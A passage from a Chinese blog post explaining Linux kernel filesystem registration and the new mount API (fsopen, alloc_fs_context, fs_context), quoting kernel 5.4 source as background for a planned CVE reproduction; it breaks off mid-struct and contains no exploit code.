<h2 id="5-注册文件系统"><a href="#5-注册文件系统" class="headerlink" title="5.注册文件系统"></a>5.注册文件系统</h2><h3 id="1-定义文件系统类型-file-system-type"><a href="#1-定义文件系统类型-file-system-type" class="headerlink" title="1.定义文件系统类型(file_system_type)"></a>1.定义文件系统类型(file_system_type)</h3><p>在注册之前，我们需要先定义一个属于自身文件系统类型的结构体<code>struct file_system_type</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">file_system_type</span> &#123;<br>	<span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<br>	<span class="hljs-type">int</span> fs_flags;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FS_REQUIRES_DEV		1 </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FS_BINARY_MOUNTDATA	2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FS_HAS_SUBTYPE		4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FS_USERNS_MOUNT		8	<span class="hljs-comment">/* Can be mounted by userns root */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FS_DISALLOW_NOTIFY_PERM	16	<span class="hljs-comment">/* Disable fanotify permission events */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FS_RENAME_DOES_D_MOVE	32768	<span class="hljs-comment">/* FS will handle d_move() during rename() internally. */</span></span><br>	<span class="hljs-built_in">int</span> (*init_fs_context)(<span class="hljs-keyword">struct</span> fs_context *);<br>	<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">fs_parameter_description</span> *parameters;<br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">dentry</span> *(*mount) (<span class="hljs-keyword">struct</span> file_system_type *, <span class="hljs-type">int</span>,<br>		       <span class="hljs-type">const</span> <span class="hljs-type">char</span> *, <span class="hljs-type">void</span> *);<br>	<span class="hljs-built_in">void</span> (*kill_sb) (<span class="hljs-keyword">struct</span> super_block *);<br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">module</span> *owner;<br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">file_system_type</span> * next;<br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">hlist_head</span> fs_supers;<br><br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">lock_class_key</span> s_lock_key;<br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">lock_class_key</span> s_umount_key;<br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">lock_class_key</span> s_vfs_rename_key;<br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">lock_class_key</span> s_writers_key[SB_FREEZE_LEVELS];<br><br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">lock_class_key</span> i_lock_key;<br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">lock_class_key</span> i_mutex_key;<br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">lock_class_key</span> i_mutex_dir_key;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>下面我们来分别解释</p>
<ul>
<li>name:文件系统的名字，如ext2&#x2F;3,xfs等等</li>
<li>fs_flags:文件系统类型<ul>
<li>FS_REQUIRES_DEV:文件系统必须在物理设备上(&#x2F;proc文件系统就不再物理设备上)</li>
<li>FS_BINARY_MOUNTDATA:当需要mount的文件系统是二进制格式下时</li>
<li>FS_HAS_SUBTYPE:文件系统有一个子类型。它是从名称中提取出来并作为参数传入的,最常见的就是FUSE，FUSE本是不是真正的文件系统，所以要通过子文件系统类型来区别通过FUSE接口实现的不同文件系统。</li>
<li>FS_USERNS_MOUNT:可以由root用户挂载(?</li>
<li>FS_RENAAME_DOES_D_MOVE: 文件系统将会在rename()函数期间处理d_move()</li>
</ul>
</li>
<li>mount():代替早期的get_sb()函数，这个sb指的是超级块，并作为用户挂载此文件系统时所使用的回调函数</li>
<li>kill_sb():删除内存中所存在的超级块，用作卸载文件系统</li>
<li>owner:指向实现这个文件系统的模块，通常表示为宏THIS_MODULE</li>
<li>next:指向链接的下一个文件系统类型</li>
<li>fs_supers:此文件系统类型的文件系统超级块都串联在该list_head之下</li>
</ul>
<p>在定义完对应的文件系统类型结构体之后，我们需要将文件系统注册进内核</p>
<h3 id="2-注册文件系统"><a href="#2-注册文件系统" class="headerlink" title="2.注册文件系统"></a>2.注册文件系统</h3><p>首先我们可以查看源码<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.4.101/source/fs/filesystems.c">fs&#x2F;filesystem.c</a></p>
<p>里面定义了大量的系统调用，其中文件开头定义了一个全局变量</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">file_system_type</span> *file_systems;<br></code></pre></td></tr></table></figure>

<p>可以看到该值的类型为一个指向file_system_type的指针，这个指针全局变量指向的是内存中所有存在的文件系统类型</p>
<p>这里我们就来看相关的注册函数</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *	register_filesystem - register a new filesystem</span><br><span class="hljs-comment"> *	@fs: the file system structure</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *	将传递的文件系统添加到内核为挂载和其他系统调用所知的文件系统列表中。</span><br><span class="hljs-comment"> *  成功时返回 0，错误时返回负 errno 代码.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *	The &amp;struct file_system_type that is passed is linked into the kernel </span><br><span class="hljs-comment"> *	structures and must not be freed until the file system has been</span><br><span class="hljs-comment"> *	unregistered.</span><br><span class="hljs-comment"> */</span><br> <br><span class="hljs-built_in">int</span> register<span class="hljs-constructor">_filesystem(<span class="hljs-params">struct</span> <span class="hljs-params">file_system_type</span> <span class="hljs-operator">*</span> <span class="hljs-params">fs</span>)</span><br>&#123;<br>	<span class="hljs-built_in">int</span> res = <span class="hljs-number">0</span>;<br>	<span class="hljs-keyword">struct</span> file_system_type<span class="hljs-operator"> ** </span>p;<br><br>	<span class="hljs-keyword">if</span> (fs-&gt;parameters<span class="hljs-operator"> &amp;&amp; </span>!fs<span class="hljs-constructor">_validate_description(<span class="hljs-params">fs</span>-&gt;<span class="hljs-params">parameters</span>)</span>)<br>		return -EINVAL;<br><br>	<span class="hljs-constructor">BUG_ON(<span class="hljs-params">strchr</span>(<span class="hljs-params">fs</span>-&gt;<span class="hljs-params">name</span>, &#x27;.&#x27;)</span>);<br>	<span class="hljs-keyword">if</span> (fs-&gt;next)<br>		return -EBUSY;<br>	write<span class="hljs-constructor">_lock(&amp;<span class="hljs-params">file_systems_lock</span>)</span>;<br>	p = find<span class="hljs-constructor">_filesystem(<span class="hljs-params">fs</span>-&gt;<span class="hljs-params">name</span>, <span class="hljs-params">strlen</span>(<span class="hljs-params">fs</span>-&gt;<span class="hljs-params">name</span>)</span>);<br>	<span class="hljs-keyword">if</span> (*p)<br>		res = -EBUSY;<br>	<span class="hljs-keyword">else</span><br>		*p = fs;<br>	write<span class="hljs-constructor">_unlock(&amp;<span class="hljs-params">file_systems_lock</span>)</span>;<br>	return res;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里我们观察到重点函数<code>find_filesystem</code>，跟进查看</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">static</span> struct file_system_type **find_filesystem(<span class="hljs-keyword">const</span> char *name, unsigned len)<br>&#123;<br>	struct file_system_type **p;<br>	<span class="hljs-keyword">for</span> <span class="hljs-function"><span class="hljs-params">(p = &amp;file_systems; *p; p = &amp;(*p)-&gt;next)</span></span><br><span class="hljs-function">		<span class="hljs-title">if</span> <span class="hljs-params">(strncmp((*p)-&gt;name, name, len) == <span class="hljs-number">0</span> &amp;&amp;</span></span><br><span class="hljs-params"><span class="hljs-function">		    !(*p)-&gt;name[len])</span></span><br><span class="hljs-function">			<span class="hljs-title">break</span>;</span><br><span class="hljs-function">	<span class="hljs-title">return</span> <span class="hljs-title">p</span>;</span><br><span class="hljs-function">&#125;</span><br></code></pre></td></tr></table></figure>

<p>就是通过全局变量file_systems通过链条来查找类型而已，找到了就返回对应的file_system_type指针</p>
<p>这样以来我们的register_filesystem的大致功能就是首先找到对应文件系统类型指针，如果不存在，则将该文件系统类型链入到全局链表的末尾，若存在则返回<code>-EBUSY</code>错误</p>
<p>经过上述函数，我们的文件系统模块才算是成功注册进内核，然后我们之后就可以使用mount系统调用继续进行挂载</p>
<h2 id="6-新一代VFS-mount系统调用"><a href="#6-新一代VFS-mount系统调用" class="headerlink" title="6.新一代VFS mount系统调用"></a>6.新一代VFS mount系统调用</h2><p><img src="http://imgsrc.baidu.com/forum/pic/item/738b4710b912c8fc91caf2fcba039245d68821c1.jpg" srcset="/img/loading.gif" lazyload></p>
<p>有大哥觉得过去的mount系统调用有许多不同的缺点，在老哥发起整改号召前，传统mount()系统调用一直被广泛使用，即使其中有着些许改变但是仍未改变其接口特性。但是在背后VFS派的AL Viro早就对此系统调用十分不满，希望迎来变革，这一密谋终于在2018年的<a target="_blank" rel="noopener" href="https://lwn.net/Articles/753473/">LSFMM大会</a>被公开，他们号召完全改写mount的系统调用接口,他们指出了传统mount系统调用中的一系列难以修复漏洞和bug，在Linux 内核5.2版本后，新一代mount API就被整合到主线Linux</p>
<p><a target="_blank" rel="noopener" href="https://patchwork.kernel.org/project/linux-security-module/cover/153754740781.17872.7869536526927736855.stgit@warthog.procyon.org.uk/">new mount API introduce</a></p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/55e736d12f2eb93897687ec393628535e5dd6ffd.jpg" srcset="/img/loading.gif" lazyload></p>
<p>上面是<a target="_blank" rel="noopener" href="https://arttnba3.cn/2023/01/11/CVE-0X09-CVE-2022-0185/#0x00-%E4%B8%80%E5%88%87%E5%BC%80%E5%A7%8B%E4%B9%8B%E5%89%8D">arttnba3师傅复现博客</a>原话:dog:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta"># mkfs.xfs -f /dev/sdb1</span><br><span class="hljs-meta"># cat old-mount-xfs.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mount.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span><br>  <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> </span>&#123;  <br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">mount</span>(<span class="hljs-string">&quot;/dev/sdb1&quot;</span>, <span class="hljs-string">&quot;/mnt/scratch&quot;</span>, <span class="hljs-string">&quot;xfs&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>)) &#123;  <br>                <span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;mount failed&quot;</span>);  <br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <br>&#125;<br><br><span class="hljs-meta"># gcc -Wall -o old-mount-xfs old-mount-xfs.c</span><br># ./mymount <br><span class="hljs-meta"># cat /proc/mounts |grep sdb1</span><br>/dev/sdb1 /mnt/scratch xfs rw,seclabel,relatime,attr2,inode64,noquota <span class="hljs-number">0</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>

<p>如上图所示我们使用传统的mount系统调用十分简单，只需要简单调用上面的函数接口即可，但是当new mount API引入之后，以前<code>臃肿</code>、<code>冗杂</code>的mount系统调用被拆解为一个一个小块来进行实现，</p>
<p>而我们的new mount API的使用，按照官方文档来说，遵循以下步骤</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lisp">fd = fsopen(<span class="hljs-string">&quot;nfs&quot;</span>)<span class="hljs-comment">;</span><br>fsconfig(<span class="hljs-name">fd</span>, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;option&quot;</span>, <span class="hljs-string">&quot;val&quot;</span>, <span class="hljs-number">0</span>)<span class="hljs-comment">;</span><br>fsconfig(<span class="hljs-name">fd</span>, FSCONFIG_CMD_CREATE, NULL, NULL, <span class="hljs-number">0</span>)<span class="hljs-comment">;</span><br>mfd = fsmount(<span class="hljs-name">fd</span>, MS_NODEV)<span class="hljs-comment">;</span><br>move_mount(<span class="hljs-name">mfd</span>, <span class="hljs-string">&quot;&quot;</span>, AT_FDCWD, <span class="hljs-string">&quot;/mnt&quot;</span>, MOVE_MOUNT_F_EMPTY_PATH)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<p>下面我们来分别介绍（由于本次复现打算在5.4上面复现，所以下面的源码都是取自kernel.5.4.101）</p>
<h3 id="1-fsopen-打开文件系统类型"><a href="#1-fsopen-打开文件系统类型" class="headerlink" title="1.fsopen(打开文件系统类型)"></a>1.fsopen(打开文件系统类型)</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 通过名字打开一个文件系统，然后为了接下来的挂载来进行配置</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 我们可以指定将在其中打开文件系统的容器，</span><br><span class="hljs-comment"> * 从而指示将使用哪些名称空间（特别是，哪个网络名称空间将用于网络文件系统）。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-constructor">SYSCALL_DEFINE2(<span class="hljs-params">fsopen</span>, <span class="hljs-params">const</span> <span class="hljs-params">char</span> <span class="hljs-params">__user</span> <span class="hljs-operator">*</span>, <span class="hljs-params">_fs_name</span>, <span class="hljs-params">unsigned</span> <span class="hljs-params">int</span>, <span class="hljs-params">flags</span>)</span><br>&#123;<br>	<span class="hljs-keyword">struct</span> file_system_type *fs_type;<br>	<span class="hljs-keyword">struct</span> fs_context *fc;<br>	const <span class="hljs-built_in">char</span> *fs_name;<br>	<span class="hljs-built_in">int</span> ret;<br><br>	<span class="hljs-keyword">if</span> (!ns<span class="hljs-constructor">_capable(<span class="hljs-params">current</span>-&gt;<span class="hljs-params">nsproxy</span>-&gt;<span class="hljs-params">mnt_ns</span>-&gt;<span class="hljs-params">user_ns</span>, CAP_SYS_ADMIN)</span>)<br>		return -EPERM;<br><br>	<span class="hljs-keyword">if</span> (flags &amp; ~FSOPEN_CLOEXEC)<br>		return -EINVAL;<br><br>	fs_name = strndup<span class="hljs-constructor">_user(<span class="hljs-params">_fs_name</span>, PAGE_SIZE)</span>;<br>	<span class="hljs-keyword">if</span> (<span class="hljs-constructor">IS_ERR(<span class="hljs-params">fs_name</span>)</span>)<br>		return <span class="hljs-constructor">PTR_ERR(<span class="hljs-params">fs_name</span>)</span>;<br><br>	fs_type = get<span class="hljs-constructor">_fs_type(<span class="hljs-params">fs_name</span>)</span>; 		<span class="hljs-comment">//通过我们传入文件系统的名称来获取对应的fs_system_type</span><br>	kfree(fs_name);<br>	<span class="hljs-keyword">if</span> (!fs_type)<br>		return -ENODEV;<br><br>	fc = fs<span class="hljs-constructor">_context_for_mount(<span class="hljs-params">fs_type</span>, 0)</span>; 	<span class="hljs-comment">//通过fs_type来准备mount上下文</span><span class="hljs-operator"></span><br><span class="hljs-operator">	</span><br><span class="hljs-operator">	...</span><br><span class="hljs-operator">	</span><br><span class="hljs-operator"></span>&#125;<br></code></pre></td></tr></table></figure>



<p>这里需要注意我们的fsopen并不是打开了一个位于硬盘上的具体的文件系统(on-disk),而是打开了一个文件系统类型（file_system_type）</p>
<h4 id="fs-context-for-mount"><a href="#fs-context-for-mount" class="headerlink" title="fs_context_for_mount"></a>fs_context_for_mount</h4><p>其中后面会调用fs_context_for_mount函数，然后调用到<code>alloc_fs_context</code>,其中传入的参数如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">enum</span> <span class="hljs-title class_">fs_context_purpose</span> &#123;<br>	FS_CONTEXT_FOR_MOUNT,		<span class="hljs-comment">/* New superblock for explicit mount */</span><br>	FS_CONTEXT_FOR_SUBMOUNT,	<span class="hljs-comment">/* New superblock for automatic submount */</span><br>	FS_CONTEXT_FOR_RECONFIGURE,	<span class="hljs-comment">/* Superblock reconfiguration (remount) */</span><br>&#125;;<br><br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">fs_context</span> *<span class="hljs-built_in">fs_context_for_mount</span>(<span class="hljs-keyword">struct</span> file_system_type *fs_type,<br>					<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> sb_flags)<br>&#123;<br>	<span class="hljs-keyword">return</span> <span class="hljs-built_in">alloc_fs_context</span>(fs_type, <span class="hljs-literal">NULL</span>, sb_flags, <span class="hljs-number">0</span>,<br>					FS_CONTEXT_FOR_MOUNT);<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="alloc-fs-context"><a href="#alloc-fs-context" class="headerlink" title="alloc_fs_context"></a>alloc_fs_context</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * alloc_fs_context - Create a filesystem context.</span><br><span class="hljs-comment"> * @fs_type: The filesystem type.</span><br><span class="hljs-comment"> * @reference: The dentry from which this one derives (or NULL)</span><br><span class="hljs-comment"> * @sb_flags: Filesystem/superblock flags (SB_*)</span><br><span class="hljs-comment"> * @sb_flags_mask: Applicable members of @sb_flags</span><br><span class="hljs-comment"> * @purpose: The purpose that this configuration shall be used for.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 打开文件系统并创建挂载上下文。 </span><br><span class="hljs-comment"> * 挂载上下文使用提供的标志进行初始化，并且如果提供了来自另一个超级块（由 @reference 引用）的子挂载/自动挂载，</span><br><span class="hljs-comment"> * 则可能具有从该超级块复制的名称空间等参数。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> fs_context *<span class="hljs-title function_">alloc_fs_context</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file_system_type *fs_type,</span><br><span class="hljs-params">				      <span class="hljs-keyword">struct</span> dentry *reference,</span><br><span class="hljs-params">				      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> sb_flags,</span><br><span class="hljs-params">				      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> sb_flags_mask,</span><br><span class="hljs-params">				      <span class="hljs-keyword">enum</span> fs_context_purpose purpose)</span><br>&#123;<br>	<span class="hljs-type">int</span> (*init_fs_context)(<span class="hljs-keyword">struct</span> fs_context *);<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> *<span class="hljs-title">fc</span>;</span><br>	<span class="hljs-type">int</span> ret = -ENOMEM;<br><br>	fc = kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> fs_context), GFP_KERNEL_ACCOUNT);<br>	<span class="hljs-keyword">if</span> (!fc)<br>		<span class="hljs-keyword">return</span> ERR_PTR(-ENOMEM);<br><br>	fc-&gt;purpose	= purpose;<br>	fc-&gt;sb_flags	= sb_flags;<br>	fc-&gt;sb_flags_mask = sb_flags_mask;<br>	fc-&gt;fs_type	= get_filesystem(fs_type);<br>	fc-&gt;cred	= get_current_cred();<br>	fc-&gt;net_ns	= get_net(current-&gt;nsproxy-&gt;net_ns);<br>	fc-&gt;<span class="hljs-built_in">log</span>.prefix	= fs_type-&gt;name;<br><br>	mutex_init(&amp;fc-&gt;uapi_mutex);<br><br>	<span class="hljs-keyword">switch</span> (purpose) &#123;<br>	<span class="hljs-keyword">case</span> FS_CONTEXT_FOR_MOUNT:<br>		fc-&gt;user_ns = get_user_ns(fc-&gt;cred-&gt;user_ns);<br>		<span class="hljs-keyword">break</span>;<br>	<span class="hljs-keyword">case</span> FS_CONTEXT_FOR_SUBMOUNT:<br>		fc-&gt;user_ns = get_user_ns(reference-&gt;d_sb-&gt;s_user_ns);<br>		<span class="hljs-keyword">break</span>;<br>	<span class="hljs-keyword">case</span> FS_CONTEXT_FOR_RECONFIGURE:<br>		<span class="hljs-type">atomic_inc</span>(&amp;reference-&gt;d_sb-&gt;s_active);<br>		fc-&gt;user_ns = get_user_ns(reference-&gt;d_sb-&gt;s_user_ns);<br>		fc-&gt;root = dget(reference);<br>		<span class="hljs-keyword">break</span>;<br>	&#125;<br><br>	<span class="hljs-comment">/* <span class="hljs-doctag">TODO:</span> Make all filesystems support this unconditionally */</span><br>	init_fs_context = fc-&gt;fs_type-&gt;init_fs_context;<br>	<span class="hljs-keyword">if</span> (!init_fs_context)<br>		init_fs_context = legacy_init_fs_context;<br><br>	ret = init_fs_context(fc);<br>	<span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br>		<span class="hljs-keyword">goto</span> err_fc;<br>	fc-&gt;need_free = <span class="hljs-literal">true</span>;<br>	<span class="hljs-keyword">return</span> fc;<br><br>err_fc:<br>	put_fs_context(fc);<br>	<span class="hljs-keyword">return</span> ERR_PTR(ret);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里我们发现代码首先是利用kzalloc分配了一个fs_context结构体，也就是我们的一个文件系统上下文，如下：</p>
<h5 id="fscontext结构体"><a href="#fscontext结构体" class="headerlink" title="fscontext结构体"></a>fscontext结构体</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 文件系统上下文，用于保存创建或重新配置超级块时使用的参数。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Superblock creation fills in -&gt;root whereas reconfiguration begins with this</span><br><span class="hljs-comment"> * already set.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * See Documentation/filesystems/mount_api.rst</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context</span> &#123;</span><br>	<span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_context_operations</span> *<span class="hljs-title">ops</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span>		<span class="hljs-title">uapi_mutex</span>;</span>	<span class="hljs-comment">/* Userspace access mutex */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_system_type</span>	*<span class="hljs-title">fs_type</span>;</span>  	<span class="hljs-comment">/* 文件系统类型 */</span><br>	<span class="hljs-type">void</span>			*fs_private;	<span class="hljs-comment">/* 文件系统上下文 */</span><br>	<span class="hljs-type">void</span>			*sget_key;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dentry</span>		*<span class="hljs-title">root</span>;</span>		<span class="hljs-comment">/* rooth */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_namespace</span>	*<span class="hljs-title">user_ns</span>;</span>	<span class="hljs-comment">/* 本次mount的用户命名空间 */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net</span>		*<span class="hljs-title">net_ns</span>;</span>	<span class="hljs-comment">/* 本次mount的网络命名空间 */</span><br>	<span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span>	*<span class="hljs-title">cred</span>;</span>		<span class="hljs-comment">/* The mounter&#x27;s credentials */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">p_log</span>		<span class="hljs-title">log</span>;</span>		<span class="hljs-comment">/* 日志缓冲区 */</span><br>	<span class="hljs-type">const</span> <span class="hljs-type">char</span>		*source;	<span class="hljs-comment">/* The source name (eg. dev path) */</span><br>	<span class="hljs-type">void</span>			*security;	<span class="hljs-comment">/* Linux S&amp;M options */</span><br>	<span class="hljs-type">void</span>			*s_fs_info;	<span class="hljs-comment">/* Proposed s_fs_info */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>		sb_flags;	<span class="hljs-comment">/* Proposed superblock flags (SB_*) */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>		sb_flags_mask;	<span class="hljs-comment">/* Superblock flags that were changed */</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>		